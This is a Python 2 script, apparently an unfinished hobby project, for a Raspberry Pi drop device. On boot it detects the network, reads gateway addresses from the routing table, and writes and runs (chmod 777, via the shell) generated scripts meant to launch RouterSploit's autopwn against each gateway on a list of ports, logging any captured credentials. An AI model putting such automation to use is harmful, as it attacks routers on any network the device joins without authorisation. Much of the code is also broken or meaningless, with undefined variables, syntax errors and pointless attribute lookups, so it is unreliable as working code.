#!/usr/bin/env/python
#coding=UTF-8
from __future__ import absolute_import
import rsf
import routersploit
from routersploit import *
from routersploit import shell
from os import path
from routersploit import *
### notes

#### because of all of this, you must instqall routersploit intoa  PATH directory, in other words...
### /usr/bin or /usr/local/bin or soemthing like that
### you then have to place your injector right into the path so that its executable and python can find it. SO...

### /usr/local/bin/routersploit/command_injector.py
## nevermind! I made it automated. It'll automatically generate a duplicate copy of the script to do its deeds.


### in return, assuming you wrote a script for it, you can immediately automate post-exploitation as soon as the pi boots up
from routersploit import exploits
from routersploit import payloads
from routersploit import wordlists
from routersploit import validators
from routersploit.shell import shell
###  CUSTOM COMMAND. Discovered new options that enabled me to directly inject python statements into RSF.
import interpreter
from interpreter import * ############ VITAL! Otherwise you cannot access the engine that processes human input into their shell syntax
from shell import *
import importlib
from importlib import *

from routersploit import (exploits,print_error,print_success,print_status,print_info,utils,threads)

import threading
import subprocess

from routersploit.utils import (
print_error,
print_status,
print_success,

print_info,
sanitize_url,
LockedIterator,
random_text,
http_request,
boolify,
mute,
multi,
index_modules,
ssh_interactive,
tokenize,
)

### notes




#### For every one of the modules. you also needed to import this crqazy shit. IT helps in getting the ungraspable modules back. But we just want to reach their custom shel since we can easily learn their syntax.




### at this point you shoudl ahve the ability to directly access your interpreter from the root of the installation directory.
### we need also a logger of our own.


def threads(): # we are planning to add more features into this to allow more penetration testing services to run concurrently.
    rsf = ''
    timer = ''
    dotdotpwn = ''
    othermodules = ''
    metasploit = ''

    return


inject_logger_printer_str = """### Create the logger
logger = logging.getLogger('basic_logger')
logger.setLevel(logging.DEBUG)

### Setup the console handler with a StringIO object
log_capture_string = io.StringIO()
ch = logging.StreamHandler(log_capture_string)
ch.setLevel(logging.DEBUG)

### Optionally add a formatter
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s - %(content)s - %(sep)s - %(end)s - %(file)s')
ch.setFormatter(formatter)

### Add the console handler to the logger
logger.addHandler(ch)


### Send log messages.
logger.debug('debug message')
logger.info('info message')
logger.warn('warn message')
logger.error('error message')
logger.critical('critical message')"""



def crontab_generator():
    return
    # if this one on the bottom works. We can then crontab the script after a successful text
    # it works but I'd rather put it into a installer file instead,

def operate_wait_and_hold_generate_py_script(target,port,threads):

    # written_target = str("{}",'').format(str(target))
    written_target = str(target)
    # written_port = str("{}",'').format(str(port))
    written_port = str(port)
    written_threads = str('8')


    #
    # written_target = ("%s",'') % (str(target))
    # written_port = ("%s",'') % (str(port))
    # written_threads = str('8')

# Heres the reason why it wont work: https://docs.python.org/2/library/weakref.html
# The weakref module allows the Python programmer to create weak references to objects.
#
# In the following, the term referent means the object which is referred to by a weak reference.
#
# A weak reference to an object is not enough to keep the object alive: when the only remaining references to a referent are weak references, garbage collection is free to destroy the referent and reuse its memory for something else. A primary use for weak references is to implement caches or mappings holding large objects, where it’s desired that a large object not be kept alive solely because it appears in a cache or mapping.
# because...
    # the author chcose to use weakrefs
    # the entire RSF framework is absed on the usage of weakrefs...
    # and at that point the weakref cannot be used elsewhere, we have little options for a display to see the captured creds.

# however....

# we can inject code into RSF installations to INTERCEPT the values BEFORE they get converted
    # but the variables will have NO VALUE. It only gets assigned a value as a weakref

#
# documentation implies that the weakref system creates TWO objects, a weakref OBJECT and the original data type, whether it be STRING, INTEGER, ETC. At some point the original thing would be deleted I guess. DOn't want it to crash you know?
# In my notes of thread_tap. it says..
# we have two arrays. It will be printed after the text gets matched up.

######## required decoder


### WE need this. but we have to import it different, or simply inject the printer.py module.

##################### LOGGER INJECTION PART ##################
#
# inject_logger_printer_str = """### Create the logger
# logger = logging.getLogger('basic_logger')
# logger.setLevel(logging.DEBUG)
#
# ### Setup the console handler with a StringIO object
# log_capture_string = io.StringIO()
# ch = logging.StreamHandler(log_capture_string)
# ch.setLevel(logging.DEBUG)
#
# ### Optionally add a formatter
# formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s - %(content)s - %(sep)s - %(end)s - %(file)s')
# ch.setFormatter(formatter)
#
# ### Add the console handler to the logger
# logger.addHandler(ch)
#
#
# ### Send log messages.
# logger.debug('debug message')
# logger.info('info message')
# logger.warn('warn message')
# logger.error('error message')
# logger.critical('critical message')"""

############### printer.py source code do not touch! ############################

# import threading
# from weakref import WeakKeyDictionary
# try:
#     import queue
# except ImportError:
#     import Queue as queue
#
#
# printer_queue = queue.Queue()
# thread_output_stream = WeakKeyDictionary()
# class PrinterThread(threading.Thread):
#     def __init__(self):
#         super(PrinterThread, self).__init__()
#         self.daemon = True
#
#     def run(self):
#         while True:
#             content, sep, end, file_, thread = printer_queue.get() # # pulls the content and headers.
#             print(float(*content, sep=sep, end=end, file=file_) # prints. SO why not just create a logger instance here?
#             printer_queue.task_done() # Deletes the queue


### because we do not actually turn all of the routersploit isntances on, we need to figure out how to initialize this too. Or we can independently, send a subprocess over to go execute thje printer.py just as soon as we got data. Either eway, we are gonna drop a logger string up here at the top.

    print '\n\n\n\t\t\t' + written_target, '\n\n\n\t\t\t' + written_port, '\n\n\n\t\t\t' + written_threads
    direct_line_feed_injection = """
#!/usr/bin/env/python
#coding=UTF-8
from __future__ import absolute_import
from __future__ import print_function
import logging
import io

### Create the logger
logger = logging.getLogger('basic_logger')
logger.setLevel(logging.DEBUG)

### Setup the console handler with a StringIO object
log_capture_string = io.StringIO()
ch = logging.StreamHandler(log_capture_string)
ch.setLevel(logging.DEBUG)

### Optionally add a formatter
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
ch.setFormatter(formatter)

### Add the console handler to the logger
logger.addHandler(ch)


### Send log messages.
logger.debug('debug message')
logger.info('info message')
logger.warn('warn message')
logger.error('error message')
logger.critical('critical message')


### Pull the contents back into a string and close the stream
log_contents = log_capture_string.getvalue()
log_capture_string.close()

### Output as lower case to prove it worked.
print(float(log_contents.lower())
import rsf
import routersploit
from routersploit import *
from routersploit import shell
from os import path
from routersploit import *
from routersploit import exploits
from routersploit import payloads
from routersploit import wordlists
from routersploit import validators
from routersploit.shell import shell
###  CUSTOM COMMAND. Discovered new options that enabled me to directly inject python statements into RSF.
import interpreter
from interpreter import * ############ VITAL! Otherwise you cannot access the engine that processes human input into their shell syntax
from shell import *
import importlib
from importlib import *

from routersploit import (exploits,print_error,print_success,print_status,print_info,utils,threads)

import threading
import subprocess

from routersploit.utils import (
print_error,
print_status,
print_success,

print_info,
sanitize_url,
LockedIterator,
random_text,
http_request,
boolify,
mute,
multi,
index_modules,
ssh_interactive,
tokenize,
)

from itertools import chain
from weakref import WeakKeyDictionary

from routersploit.utils import print_status, NonStringIterable

import printer
from printer import absolute_import



################# actual commands.
RoutersploitInterpreter.parse_line.__init__
RoutersploitInterpreter.command_use.__name__
self = "routersploit/interpreter"
RoutersploitInterpreter.parse_line.__init__
exploits.__init__
exploits.Exploit.__init__
routersploit.exploits.__name__ = "autopwn"
routersploit.exploits.ExploitOptionsAggregator.__init__


############### oh wow. it actually workedd. Make sure you encode your strings into hex before you write, and decode before you interpret.

### to initialize###
target = ''
port = 0
threads = 8


### maybe I am supoosed to have the second string NOT EMPTY.


### importing the values
target = ('{0}').decode('hex')
port = {1}
threads = {2}

# ## ValueError: invalid literal for int(float() with base 10:
### https://stackoverflow.com/questions/1841565/valueerror-invalid-literal-for-int-with-base-10
## I learned its not a good idea to convert from text files back to python. AS it turns out formatting errors are everywhere!
target = str(target)
port = int(float(port))
threads = int(float(threads))

target = target.decode('unicode')

# routersploit.exploits.Option = (object,string)
routersploit.exploits.Option(target, '')
routersploit.exploits.Option(port, '')
routersploit.exploits.Option(threads,'')


exploits.Exploit.run_threads.im_self

RoutersploitInterpreter.command_run.im_self
routersploit.utils.print_status
RoutersploitInterpreter.history_file
RoutersploitInterpreter.history_file.decode
exploits.print_status.func_globals
# print sys.stdout
# print sys.stdout.encoding
# print sys.stdout.errors
# print sys.stdout.write

############# print everything ##################


printer.print_function()
printer.PrinterThread.start()
printer.PrinterThread.__init__()
printer.thread_output_stream.data.fromkeys()
printer.thread_output_stream.data.has_key()
printer.thread_output_stream.data.iterkeys()
printer.thread_output_stream.data.itervalues()
printer.thread_output_stream.data.viewkeys()
printer.thread_output_stream.data.viewvalues()


############# run command ################
interpreter.RoutersploitInterpreter.command_run.im_self.__init__

""".format(
            str(written_target).encode('hex'),
            int(float(written_port)),
            int(float(written_threads))
        )
# it spelled out hex2char out of range error.


    direct_line_feed_injection = str(direct_line_feed_injection)
    w = open('/usr/local/bin/direct_injection_exec.py','w')
    w.write(direct_line_feed_injection)
    w.close()
    # time.sleep(3) # to avoid crashing the program
    chmod = "chmod 777 {}".format(str('/usr/local/bin/direct_injection_exec.py &'))
    rsf_command(str(chmod))
    cmd = "python %s" % str('/usr/local/bin/direct_injection_exec.py &')
    rsf_command(cmd)
    # open_display_thread()

    # time.sleep(0.5)
    return


#
# import thread_tap
# from thread_tap import *


# proc = subprocess.Popen(...)
# try:
#     outs, errs = proc.communicate(timeout=15)
# except TimeoutExpired:
#     proc.kill()
#     outs, errs = proc.communicate()

# start printer

# def open_display_thread():
#
#     thread_tap.p_generate()
#     return
def rsf_command(cmd):
    progress = subprocess.call(cmd,shell=True,executable='/bin/bash')
    print progress
    return progress
def line_feed_queue(results):
    port_list = [
        80,
        443,
        8080,
        81,
        4567,
        9999,
        22,
        23,
        25,
        53
    ]
    for ip in results:
        target = exploits.Option(str(ip))
        for port in list_of_ports:
            port = exploits.Option(str(port))
            threads = exploits.Option(int(8))
            # open_display_thread()
            operate_wait_and_hold_generate_py_script(target, port, threads)
    return
def extract_targets(results):
    for target in results:
         target = str(target)
         port_list = [
             80,
             443,
             8080,
             81,
             4567,
             9999,
             22,
             23,
             25,
             53
         ]

         # for ip in results:
         threads = int(8)
         target = exploits.Option(str(target))
         for port in list_of_ports:
             port = exploits.Option(int(float(port)))
             operate_wait_and_hold_generate_py_script(target, port, threads)
    return

def rsf_primary_thread(cmd):
    results = subprocess.Popen(cmd,shell=True,executable='/bin/bash')
    results = str(results)

    for target in results:
         target = str(target)
         port_list = [
             80,
             443,
             8080,
             81,
             4567,
             9999,
             22,
             23,
             25,
             53
         ]
         # for ip in results:
         for port in port_list:
             target = str(target)
             port = str(port)
             threads = str('8')

             # target = target.__str__
             # port = port.__str__
             # threads = '8'
             target = exploits.Option(target)
             port = exploits.Option(port)
             threads = exploits.Option(threads)
             operate_wait_and_hold_generate_py_script(target, port, threads)
    return

def pull_routing_path():
    command = """route -n | egrep -v "0.0.0.0|Gateway|routing|127.0.0.1" | sort | uniq | awk '{{print $2}}'"""
    rsf_primary_thread(command)
    return
def bash_command(cmd):
    output = subprocess.call(cmd,shell=True,executable='/bin/bash')
    return output

def bash_command_bg(cmd):
    p = subprocess.Popen(cmd,shell=True,executable='/bin/bash')
    # executes the commands and then returns the process back to us as a separate thread.
    return p

def detect_network():
    # detects the assignment  of a local IP, which guarantees that you have been connected to the LOCAL network, good enough for wireless exploitation
    time.sleep(5) # checks every 5 seconds
    detection_test = "ifconfig | grep inet | awk '{{print $2}}'"
    test_results = bash_command(detection_test)
    if test_results != "" or None or 0:
        if test_results != "0.0.0.0" or '127.0.0.1' or 'ether':
            print "SUCCESSFULLY CONNECTED: Your ip address is \n\t%s" % test_results
            bash_command("python /usr/local/bin/routersploit/printer.py &") # run it in background
            time.sleep(2)
            pull_routing_path()
        else:
            detect_network()
    else:
        detect_network()
    return
print "Raspberry Pi just booted. Scanning for networks to login to."
detect_network()



#############DOCUMENTATION ON WEAK REF STRUCTURE
# Something about weak refs
# """Changed in version 3.2: Added support for thread.lock, threading.Lock, and code objects.
#
# Several built-in types such as list and dict do not directly support weak references but can add support through subclassing:
#
# class Dict(dict):
#     pass
#
# obj = Dict(red=1, green=2, blue=3)   # this object is weak referenceable
#***Allows the printing of the object basically.... we can have it iterated BEFORE the object is passed.
# Other built-in types such as tuple and int do not support weak references even when subclassed (This is an implementation detail and may be different across various Python implementations.).
#
# Extension types can easily be made to support weak references; see Weak Reference Support."""

# DEBUG: """"Return a weak reference to object. The original object can be retrieved by calling the reference object if the referent is still alive; if the referent is no longer alive, calling the reference object will cause None to be returned. If callback is provided and not None, and the returned weakref object is still alive, the callback will be called when the object is about to be finalized; the weak reference object will be passed as the only parameter to the callback; the referent will no longer be available.
# DEBUG: So basically there are two things like key-value pairs in a dictionary. WE have a referent and a reference object,
# DEBUG: Unlike dictionaries, the key will "die" when the object gets passed.
# DEBUG:  SO parameters and args must hbe itereated and printed BEFORE.
# DEBUG: I think the dev also used hashables.
# DEBUG: SO it looks like there is no logging supoiorted for weakrefs. but we can still LOG the values by iterating them qwith callbacks BEFORE they get passed to something.


# DEBUG: because each file has ONE weakref with its own dicts and values, we can make a new module to ITERATE through each file's references, call the callbacks and then log them.
# coding_resources_routersploit/usrbindir/routersploit/exploits.py:1
# coding_resources_routersploit/usrbindir/routersploit/exploits.pyc:1
# coding_resources_routersploit/usrbindir/routersploit/printer.py:1
# coding_resources_routersploit/usrbindir/routersploit/printer.pyc:1
# exploits.py:1
# exploits.pyc:1
# notesonprinterprocesstoallowdisplay:4
# printer.py:1
# printer.pyc:1
# routersploit/exploits.py:1
# routersploit/current_command_injector.py:11
# routersploit/thread_tap.pyc:2
# routersploit/exploits.pyc:1
# routersploit/routersploit/exploits.py:1
# routersploit/routersploit/exploits.pyc:1
# routersploit/routersploit/routersploit/exploits.py:1
# routersploit/routersploit/routersploit/exploits.pyc:1
# routersploit/routersploit/routersploit/printer.py:1
# routersploit/routersploit/routersploit/printer.pyc:1
# routersploit/routersploit/printer.py:1
# routersploit/routersploit/printer.pyc:1
# routersploit/thread_tap.py:2
# routersploit/printer.py:1
# routersploit/printer.pyc:1

# DEBUG: WOw I ahve more weak references than them. AHa.

# Direect feed method. according to this article
# requires perfect path positioning! Might need to makea  launcher script for usr bins
# we still have the display issue to deal with and logging. So we need toa dd that in there too.


# requires me to put it on path chmod +x arbitraryname
# but I may use symbolic links cd ~/bin/
#ln -s ~/some/path/to/myscript/arbitraryname
# double check which interpreter with which commands
# https://dbader.org/blog/how-to-make-command-line-commands-with-python
# start_printer_service == True
# while start_printer_service == True:
#     try:
#         printer_init_cmd = "python /usr/local/bin/routersploit/printer.py"
#         p = bash_command_bg(printer_init_cmd)
#         output = p.communicate()
#         print output
#     except KeyboardInterrupt:
#         exit(0)
# else:
#     start_printer_service()
#     # return output
# # or even better write a script. and have python execute it which may be more successful, no spacing isses
# def start_printer_service():
#     bash_command('python thread_inject_printer.py')
#     printer_loop()
#     return True
